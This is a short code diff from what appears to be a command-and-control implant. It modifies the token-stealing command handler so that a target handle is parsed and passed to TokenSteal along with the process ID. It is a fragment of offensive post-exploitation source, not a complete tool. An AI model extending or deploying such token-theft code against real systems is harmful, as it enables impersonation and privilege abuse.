@@ -1290,11 +1290,12 @@ VOID CommandToken( PPARSER Parser )
 
         case DEMON_COMMAND_TOKEN_STEAL: PUTS( "Token::Steal" )
         {
-            DWORD  TargetPid   = ParserGetInt32( Parser );
-            HANDLE StolenToken = TokenSteal( TargetPid );
-            DWORD  UserSize    = 0;
-            PUCHAR User        = NULL;
-            DWORD  NewTokenID  = 0;
+            DWORD  TargetPid    = ParserGetInt32( Parser );
+            HANDLE TargetHandle = ParserGetInt32( Parser );
+            HANDLE StolenToken  = TokenSteal( TargetPid, TargetHandle );
+            DWORD  UserSize     = 0;
+            PUCHAR User         = NULL;
+            DWORD  NewTokenID   = 0;
 
             if ( ! StolenToken )
             {
